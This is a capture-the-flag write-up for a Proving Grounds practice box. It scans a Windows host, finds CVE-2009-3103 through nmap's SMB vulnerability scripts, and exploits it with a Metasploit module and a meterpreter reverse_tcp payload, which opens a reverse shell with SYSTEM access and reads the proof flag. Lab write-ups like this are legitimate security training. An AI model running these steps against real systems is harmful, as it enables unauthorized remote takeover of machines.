---
layout: post
author: H4
---

This is an Offensive Security proving grounds practice box.

# enumeration

Performing a simple `nmap` scan to identify the attack surface of the target.

```bash
$ nmap -Pn 192.168.97.40
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-08 05:54 EST
Nmap scan report for 192.168.97.40
Host is up (0.097s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 6.72 seconds
```

---

# vulnerability

As we see that the `smb` service is available at the target we start with a simple scan for common vulnerbilities.

```bash
$ nmap --script smb-vuln* -p445 192.168.97.40
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-08 05:55 EST
Nmap scan report for 192.168.97.40
Host is up (0.097s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
|_smb-vuln-ms10-054: false
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103

Nmap done: 1 IP address (1 host up) scanned in 61.07 seconds
```

> The target is vulnerable for CVE-2009-3103
{: .prompt-info }

---

# exploitation

We can simply exploit the vulnerability by using `metasploit`.

```bash
msf6 > search CVE-2009-3103

Matching Modules
================

   #  Name                                                       Disclosure Date  Rank    Check  Description
   -  ----                                                       ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms09_050_smb2_negotiate_func_index     2009-09-07       good    No     MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   1  auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                   normal  No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   2  auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                      normal  No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference


Interact with a module by name or index. For example info 2, use 2 or use auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff
```

Choose the only available exploit and set the target and payload settings.
```bash
msf6 > use 0

msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > options

Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.97.40    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   445              yes       The target port (TCP)
   WAIT    180              yes       The number of seconds to wait for the attack to complete.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.49.97    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)
```

Exploit the target.
```
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > run

[*] Started reverse TCP handler on 192.168.49.97:4444
[*] 192.168.97.40:445 - Connecting to the target (192.168.97.40:445)...
[*] 192.168.97.40:445 - Sending the exploit packet (951 bytes)...
[*] 192.168.97.40:445 - Waiting up to 180 seconds for exploit to trigger...
[*] Sending stage (175174 bytes) to 192.168.97.40
[*] Meterpreter session 1 opened (192.168.49.97:4444 -> 192.168.97.40:49159 ) at 2022-01-08 06:15:17 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> Yay we got `NT AUTHORITY\SYSTEM` access.
{: .prompt-info }

---

# get the flag
```bash
meterpreter > shell
Process 4052 created.
Channel 1 created.
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd ..
cd ..

C:\Windows>cd ..\users\Administrator
cd ..\users\Administrator

C:\Users\Administrator>dir Desktop
dir Desktop
 Volume in drive C has no label.
 Volume Serial Number is B863-254D

 Directory of C:\Users\Administrator\Desktop

02/03/2011  07:51 PM    <DIR>          .
02/03/2011  07:51 PM    <DIR>          ..
05/20/2016  09:26 PM                32 network-secret.txt
01/08/2022  03:13 AM                34 proof.txt
               2 File(s)             66 bytes
               2 Dir(s)   4,110,790,656 bytes free

C:\Users\Administrator>type Desktop\proof.txt
type Desktop\proof.txt
c******************************e
```

Pwned! <@:-)
